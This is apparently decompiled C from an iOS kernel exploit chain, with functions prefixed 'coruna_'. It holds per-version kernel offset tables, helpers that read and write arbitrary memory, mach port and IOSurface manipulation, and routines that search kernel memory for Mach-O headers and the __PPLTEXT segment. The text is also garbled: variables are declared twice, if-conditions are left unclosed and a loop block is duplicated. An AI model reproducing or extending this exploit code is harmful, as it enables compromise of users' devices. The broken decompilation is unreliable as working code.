      if (port < 0x1f530f02800000) {
        size = 0x290;
      }
      count = 0x1c4;
      if (port < 0x1f530f02800000) {
        count = 0x230;
      }
      idx = 400;
      status = 0x194;
    }
    else {
      if (size != 0x1809) {
        if (size != 0x1c1b) {
          return 0x2802c;
        }
        status = (version & 0x84000) != 0;
        version = 0x280;
        if (status) {
          version = 0x288;
        }
        status = 0x16c;
        if (status) {
          status = 0x174;
        }
        idx = 0x22c;
        if (status) {
          idx = 0x234;
        }
        err = 0x184;
        if (status) {
          err = 0x18c;
        }
        status = 0x1c1b19145fffff < port;
        size = 0x1c0;
        if (status) {
          size = version;
        }
        count = 0x16c;
        flags = 0xac;
        if (status) {
          count = idx;
          flags = status;
        }
        status = 0xc4;
        if (status) {
          status = err;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x18090a095ffffe < port;
      status = port == 0x18090a095fffff;
      size = 0x1a0;
      if (port < 0x18090a09600000) {
        size = 0x1a8;
      }
      flags = 0xa4;
      if (port < 0x18090a09600000) {
        flags = 0xac;
      }
      count = 0x14c;
      if (port < 0x18090a09600000) {
        count = 0x154;
      }
      idx = 0xc4;
      status = 0xbc;
    }
    if (!err || status) {
      status = idx;
    }
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  if ((size != 0x2258) && (size != 0x225c)) {
    if (size != 0x2712) {
      return 0x2802c;
    }
    version = version & 0x518e241;
    if (version < 0x100000) {
      if (version == 1) {
        version = 0;
      }
      else {
        if ((version != 0x4000) && (version != 0x80000)) {
          return 0x2802c;
        }
        version = 0x10;
      }
    }
    else if ((version == 0x100000) || (version == 0x1000000)) {
      version = 0x18;
    }
    else {
      if (version != 0x4000000) {
        return 0x2802c;
      }
      version = 0x68;
    }
    size = version | 0x200;
    flags = version + 0x164;
    count = version + 0x1b4;
    status = version + 0x17c;
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  version = version & 0x518e241;
  if (version < 0x80000) {
    if (version == 1) {
      status = 0x10;
    }
    else {
      if (version != 0x200) {
        if (version != 0x4000) {
          return 0x2802c;
        }
        goto done;
      }
      status = 0;
    }
  }
  else if (version == 0x80000) {
done:
    status = 0x20;
  }
  else {
    if ((version != 0x100000) && (version != 0x1000000)) {
      return 0x2802c;
    }
    status = 0x28;
  }
  size = status + 0x1e8;
  flags = status + 0x154;
  count = status + 0x19c;
  status = status + 0x16c;
fail:
  *flags_2 = size;
  *flags = flags;
  *count_2 = count;
  *fd_3 = status;
  return 0;
}





void coruna_kernel29478_via_mach_port_deallocate_2a684(long handle,int flags,uint64_t *val)
{
  long handle;
  uint64_t u;
  uint scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 4;
  if ((*(long *)(handle + 0x248) == 0) || (*(long *)(handle + 0x250) == 0)) {
    u = coruna_mach_port_deallocate_2a684(handle,2,&bootargs,&scratch);
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
  handle = 0x248;
  if (flags == 0) {
    handle = 0x250;
  }
  *val = *(uint64_t *)(handle + handle);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





long coruna_return_zero_2d590(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel600c_via_return_zero_15aac(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-2];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-1];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (addr_2 - off_3) + arg;
}





void coruna_kernel600c_via_return_zero_15aac(uint *size)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  long off;
  long base;
  unsigned long size;
  unsigned long scratch;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(size + 0x626);
  if (off == 0) {
    scratch = scratch & 0xffffffff00000000;
    off = coruna_return_zero_15aac(*(uint64_t *)(size + 0x67e),&scratch);
    if (off == 0 || (uint)scratch == 0) {
      u = 0xad011;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    *(long *)(size + 0x626) = off;
    size[0x628] = (uint)scratch;
done:
    base = 0;
    size = 0;
    do {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,off + base,0x18,&scratch);
      if (err == 0) {
        u = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return;
        }
        ___stack_chk_fail(u);
      }
      addr = bootargs;
      if ((*size & 0x20) != 0) {
        addr = bootargs << 0xe;
      }
      handle = (long)size + base;
      *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
      *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
      *(long *)(&k_kernel_slot_1a18 + handle) = addr;
      size = size + 1;
      base = base + 0x18;
    } while (size < size[0x628]);
  }
  {
    base = 0;
    size = 0;
    do {
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,off + base,0x18,&scratch);
    if (err == 0) {
    u = 0x2800f;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
    }
    addr = bootargs;
    if ((*size & 0x20) != 0) {
    addr = bootargs << 0xe;
    }
    handle = (long)size + base;
    *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
    *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
    *(long *)(&k_kernel_slot_1a18 + handle) = addr;
    size = size + 1;
    base = base + 0x18;
    } while (size < size[0x628]);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





long coruna_return_zero_2d754(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel600c_via_return_zero_15aac(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-1];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-2];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (off_3 - addr_2) + arg;
}





uint64_t coruna_return_zero_2d800(long handle,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel600c_via_return_zero_28118_2(handle);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_29fc4(handle,handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&bootargs);
    if ((err == 0) ||
       (err = coruna_kernel600c_residual_228(handle,handle + *(int *)(handle + 0x168),&scratch), err == 0)) {
      return 0;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  u = coruna_return_zero_2d754(handle,bootargs,scratch,val);
  return u;
}





uint64_t coruna_return_zero_2d8b4(long handle,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel600c_via_return_zero_28118_2(handle);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_29fc4(handle,handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&bootargs);
    if ((err == 0) ||
       (err = coruna_kernel600c_residual_228(handle,handle + *(int *)(handle + 0x168),&scratch), err == 0)) {
      return 0;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  u = coruna_return_zero_2d590(handle,bootargs,scratch,val);
  return u;
}





void coruna_kernel09_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (*(long *)((long)bootargs + addr + -8) != 0) {
        if ((*(int *)((long)bootargs + addr) != 0) &&
           if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
           return;
           }
           ___stack_chk_fail(version);
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}





uint coruna_mach_make_memory_entry_2da70(unsigned long arg,unsigned long arg,uint64_t *val)
{
  pthread_mutex_t *ptr;
  int err;
  uint32_t u;
  uint8_t *ptr;
  uint size;
  uint version;
  long handle;
  unsigned long port;
  long addr;
  long *ptr;
  long off;
  unsigned long tag;
  vm_inherit_t in_stack_ffffffffffffff30;
  uint scratch;
  int bootargs;
  mem_entry_name_port_t thread_attr;
  unsigned long host_info;
  uint32_t *serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  val[6] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  ptr = k_kernel_mach_task_self_slot;
  serial_buf = (uint32_t *)0x0;
  tag = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(arg + 0x140);
  size = 0x2802c;
  port = arg;
  if (err < 0x2258) {
    if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return size;
    }
    ___stack_chk_fail(port);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
  return size;
  }
  ___stack_chk_fail(port);
}





unsigned long coruna_mach_port_deallocate_2ddc8(uint64_t arg,vm_address_t *val)

{
  uint8_t *str;
  int n;
  uint u;
  unsigned long size;
  
  size = 0xad001;
  if ((val[2] != 0) && (*val != 0)) {
    n = coruna_mach_vm_machine_attribute(arg,val[2] + (unsigned long)(uint)val[6],0xffffffff);
    str = k_kernel_mach_task_self_slot;
    if (n == 0) {
      size = 0x28010;
    }
    else {
      u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*val,
                             val[1] * (unsigned long)*(uint *)((long)val + 0x1c));
      if ((u == 0) &&
         (u = _mach_port_deallocate
                            (*(ipc_space_t *)str,*(mach_port_name_t *)((long)val + 0x34)),
         u == 0)) {
        size = coruna_kernel600c_via_mach_port_allocate(arg,val[2],(int)val[3]);
      }
      else {
        size = (unsigned long)(u | 0x80000000);
      }
    }
  }
  val[6] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  return size;
}





void coruna_kernel600c_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (((*(long *)((long)bootargs + addr + -8) != 0) &&
          (*(int *)((long)bootargs + addr) != 0)) &&
         if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
         return;
         }
         ___stack_chk_fail(version);
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}





uint32_t coruna_call_call_mach_vm_machine_attribute_29df8_1c57c(uint64_t val,long handle,uint64_t id_2)
{
  uint32_t u;
  int err;
  
  err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,handle + 8,2,id_2);
  u = 0x2800f;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_call_call_mach_vm_machine_attribute_29df8_1e994(uint64_t val,long handle,uint16_t arg)
{
  uint32_t u;
  int err;
  uint16_t scratch;
  
  scratch = arg;
  err = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,handle + 8,&scratch,2);
  u = 0x28010;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint coruna_iosurface_index_bias(uint size)
{
  uint u;
  
  u = 0xfffffffe;
  if (size < 0xfff5) {
    u = size + 10;
  }
  if (size < 0xfffe) {
    size = u;
  }
  return size & 0xffff;
}





uint32_t coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_3(uint64_t val,long handle)
{
  bool err;
  ushort u;
  int err;
  long handle;
  uint32_t size;
  ushort scratch;
  ushort bootargs;
  
  size = 0x2800f;
  handle = coruna_ptr_canonicalize();
  if (handle == 0) {
    size = 0x28026;
  }
  else {
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,handle + 8,2,&scratch);
    if (err != 0) {
      if (scratch < 0xfffe) {
        u = scratch + 10;
        err = scratch < 0xfff5;
        scratch = 0xfffe;
        if (err) {
          scratch = u;
        }
        bootargs = scratch;
        err = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,handle + 8,&bootargs,2);
        size = 0;
        if (err == 0) {
          size = 0x28010;
        }
      }
      else {
        size = 0;
      }
    }
  }
  return size;
}





unsigned long coruna_kernel600c_via_return_zero_2d8b4(long arg,unsigned long val)

{
  unsigned long type_id_21;
  int n;
  long serial_11;
  unsigned long size;
  unsigned long version;
  uint8_t scratch[32];
  unsigned long cache_91;
  
  version = *(unsigned long *)(arg + 0x188);
  size = val & (version ^ 0xffffffffffffffff);
  if ((*(unsigned long *)(&k_kernel_slot_18b8 + arg) == 0 || *(unsigned long *)(&k_kernel_slot_18b8 + arg) != size) ||
     (*(long *)(&k_kernel_slot_18c0 + arg) == 0)) {
    n = coruna_call_mach_vm_machine_attribute_29df8_17fcc(arg,size,scratch);
    if (n == 0) {
      size = 0;
    }
    else {
      serial_11 = coruna_return_zero_2d8b4(arg,cache_91 & 0xffffffffc000);
      type_id_21 = 0;
      if (serial_11 != 0) {
        type_id_21 = serial_11 + (version & val);
      }
      size = 0;
      if (serial_11 != 0 && type_id_21 != 0) {
        size = *(unsigned long *)(arg + 0x188);
        *(unsigned long *)(&k_kernel_slot_18b8 + arg) = val & (size ^ 0xffffffffffffffff);
        *(unsigned long *)(&k_kernel_slot_18c0 + arg) = type_id_21 & (size ^ 0xffffffffffffffff);
        size = type_id_21;
      }
    }
  }
  else {
    size = *(long *)(&k_kernel_slot_18c0 + arg) + (version & val);
  }
  return size;
}
uint64_t coruna_mach_port_deallocate_2e14c(long *handle)
{
  task_t target_task;
  uint8_t *ptr;
  uint u;
  unsigned long size;
  bool err;
  int err;
  mach_port_t lm6;
  uint version;
  kern_return_t lk8;
  uint port;
  uint tag;
  long handle;
  unsigned long kind;
  long addr;
  long off;
  int *err;
  uint *buf;
  bool status;
  long base;
  uint64_t *str;
  long ctx_val;
  uint type_id;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  uint64_t serial_buf;
  uint64_t action;
  mach_msg_type_number_t block_ctx;
  thread_act_array_t stack_guard;
  mach_port_name_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t region[7];
  long plist;
  
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  base = *handle;
  port = *(uint *)(handle + 1);
  sa_new = 0;
  sa_saved = 0;
  stack_guard = (thread_act_array_t)0x0;
  block_ctx = 0;
  target_task = *(task_t *)(&k_kernel_slot_18f8 + base);
  serial_buf = 0;
  action = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  path_buf = 0xffffffffffffffff;
  thread_attr = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  host_info = 0xffffffffffffffff;
  tmp_buf = 0xffffffffffffffff;
  handle = coruna_kernel600c_str_08_29_40_92_09_15_80_52(base,"MAC Labels");
  kind = 0;
  if ((handle == 0) || (kind = coruna_macho_data_seg_34e78(base,handle), (int)kind != 0)) {
fail:
    port = 0;
    *(uint *)((long)handle + 0xc) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
    return 0;
    }
    ___stack_chk_fail(kind);
  }
  str = region;
  handle = -3;
  while (ptr = k_kernel_mach_task_self_slot, handle != 0) {
    kind = coruna_kernel600c_via_kernel600c_via_fd_read_full_2(base,*(long *)(&k_kernel_slot_18f0 + base) +
                                 (unsigned long)(uint)(*(int *)(base + 0x168) * ((int)handle + 4)),str
                         );
    str = str + 1;
    handle = handle + 1;
    {
      port = 0;
      *(uint *)((long)handle + 0xc) = port;
      if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
      return 0;
      }
      ___stack_chk_fail(kind);
    }
  }
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_2a678(base,*(uint32_t *)k_kernel_mach_task_self_slot,&serial_buf);
  version = 0x28026;
  if ((handle == 0) ||
     ((u = (uint)serial_buf, ((uint)serial_buf >> 10 & 1) == 0 &&
      (err = coruna_mach_vm_machine_attribute(base,handle,(uint)serial_buf | 0x400), err == 0))))
  handle = 0;
  err = true;
  do {
  status = err;
  err = *(int *)((long)&action + handle * 4);
  if (err != -1) {
  _close(err);
  }
  handle = 1;
  err = false;
  } while (status);
  handle = 0;
  do {
  port = *(uint *)((long)&path_buf + handle);
  if (port != 0xffffffff) {
  port = _close(port);
  }
  handle = handle + 4;
  } while (handle != 0x30);
  if (1 < sa_saved + 1) {
  port = _mach_port_deallocate(*(ipc_space_t *)ptr,sa_saved);
  }
  kind = (unsigned long)port;
  port = (uint)(version == 0);
  *(uint *)((long)handle + 0xc) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
  return 0;
  }
  ___stack_chk_fail(kind);
}





void coruna_ptr_store(uint64_t val,uint64_t *id_2)
{
  *id_2 = val;
  return;
}





void coruna_ptr_clear(uint64_t *val)
{
  *val = 0;
  return;
}





bool coruna_vm_region_read_u32(long handle,long addr_2,uint32_t *size)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *size = *(uint32_t *)(handle + addr_2);
  }
  return handle != 0;
}





bool coruna_vm_region_write_u32(long handle,long addr_2,uint32_t size)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *(uint32_t *)(handle + addr_2) = size;
  }
  return handle != 0;
}





bool coruna_vm_region_slot_read(long handle,long addr_2,uint64_t *val)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *val = *(uint64_t *)(handle + addr_2);
  }
  return handle != 0;
}





bool coruna_vm_region_slot_write(long handle,long addr_2,uint64_t val)
{
  long handle;
  
  handle = *(long *)(handle + 8);
  if (handle != 0) {
    *(uint64_t *)(handle + addr_2) = val;
  }
  return handle != 0;
}





void coruna_call_mach_make_memory_entry_2da70(uint64_t *val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  
  size_3[5] = 0;
  size_3[4] = 0;
  size_3[7] = 0;
  size_3[6] = 0;
  size_3[1] = 0;
  *size_3 = 0;
  size_3[3] = 0;
  size_3[2] = 0;
  err = coruna_mach_make_memory_entry_2da70(*val,id_2,size_3 + 1);
  if (err == 0) {
    *size_3 = val;
  }
  return;
}





uint64_t coruna_call_mach_port_deallocate_2ddc8(uint64_t *val)
{
  uint64_t u;
  
  if (val[1] == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_port_deallocate_2ddc8(*(uint64_t *)*val);
    if ((int)u == 0) {
      val[5] = 0;
      val[4] = 0;
      val[7] = 0;
      val[6] = 0;
      val[1] = 0;
      *val = 0;
      val[3] = 0;
      val[2] = 0;
    }
  }
  return u;
}





unsigned long coruna_ioregistryentryfrompath(long arg,unsigned long val)

{
  int fd_11;
  uint64_t type_id_17;
  long serial_11;
  unsigned long size;
  int cache_77 [3];
  int cache_82;
  uint scratch;
  unsigned long cache_55;
  
  if (val == 0) {
    cache_55 = val;
    type_id_17 = _IORegistryEntryFromPath
                      (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IOService:/");
    if ((int)type_id_17 + 1U < 2) {
      return 0;
    }
    serial_11 = coruna_ret_stub_2(arg,type_id_17);
    if (serial_11 == 0) {
      return 0;
    }
    cache_55 = coruna_return_zero_28118(arg,serial_11);
    if (cache_55 == 0) {
      return 0;
    }
    fd_11 = coruna_kernel600c_residual_228(arg,cache_55,&cache_55);
    if (fd_11 == 0) {
      return 0;
    }
    cache_55 = coruna_kernel600c_via_ctx_test_flag_9(arg,cache_55);
    fd_11 = coruna_kernel600c_residual_228(arg,cache_55,&cache_55);
    if (fd_11 == 0) {
      return 0;
    }
    val = coruna_kernel600c_via_ctx_test_flag_9(arg,cache_55);
  }
  serial_11 = 0x4000;
  if (*(int *)(arg + 0x180) != 0x4000) {
    serial_11 = 0x100000;
  }
  size = val & -serial_11;
  if (*(int *)(arg + 0x180) != 0x4000) {
    size = (val & -serial_11) + 0x4000;
  }
  if (size < 0xffff000000000000) {
    return 0;
  }
  cache_55 = val;
  do {
    fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,size,4,cache_77);
    if (fd_11 == 0) {
      return 0;
    }
    if (cache_77[0] == -0x1120531) {
      fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,size + 4,0x18,(unsigned long)cache_77 | 4);
      if (fd_11 == 0) {
        return 0;
      }
      if (((cache_82 == 2) && (8 < scratch)) && (scratch < 0x40)) {
        return size;
      }
    }
    size = size - serial_11;
    if (size < 0xffff000000000000) {
      return 0;
    }
  } while( true );
}





uint64_t coruna_kernel600c_via_ioregistryentryfrompath(long handle,long addr_2)
{
  int err;
  uint64_t u;
  void *ptr;
  uint32_t size;
  uint64_t version;
  uint64_t port;
  
  if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
    if ((addr_2 == 0) && (addr_2 = coruna_ioregistryentryfrompath(handle,0), addr_2 == 0)) {
      u = 0x28014;
    }
    else {
      ptr = _calloc(0x128,1);
      if (ptr == (void *)0x0) {
        u = 0xad009;
      }
      else {
        coruna_ctx_clear_1090c(ptr,handle);
        u = *(uint64_t *)(handle + 0x140);
        port = *(uint64_t *)(handle + 0x158);
        version = *(uint64_t *)(handle + 0x150);
        *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
        *(uint64_t *)((long)ptr + 0x70) = u;
        *(uint64_t *)((long)ptr + 0x88) = port;
        *(uint64_t *)((long)ptr + 0x80) = version;
        *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
        *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
        *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
        size = 0x480;
        if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
          size = 0x80;
        }
        err = coruna_call_find_text_exec(ptr,0,addr_2,size);
        if (err == 0) {
          u = 0x28017;
        }
        else {
          u = 0;
          *(void **)(&k_kernel_slot_19f8 + handle) = ptr;
        }
      }
    }
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_find_ppltext_2ec0c(uint64_t *val,long handle)
{
  int err;
  long handle;
  unsigned long u;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  err = coruna_ctx_test_flag(handle,0x20);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      coruna_macho_find_loadcmd(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      val[1] = scratch;
      *val = scratch;
      val[2] = bootargs;
      return;
    }
    coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      *val = scratch;
      val[1] = scratch;
      val[2] = bootargs;
      return;
    }
    scratch = (scratch + bootargs) - 0x20000;
    bootargs = 0x20000;
    handle = coruna_strsep(&scratch,"08 DC 70 92",0,1);
    if ((handle != 0) &&
       (u = coruna_kernel600c_via_kernel600c_via_ioservice_open_path(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -4), u != 0)) {
      coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((scratch < u || scratch - u == 0) && (u < bootargs + scratch)) {
        *val = scratch;
        val[1] = u;
        handle = (scratch - u) + bootargs;
        val[2] = handle;
        if (handle != 0) {
          return;
        }
      }
    }
  }
  coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
fail:
  val[1] = scratch;
  *val = scratch;
  val[2] = bootargs;
  return;
}





uint64_t
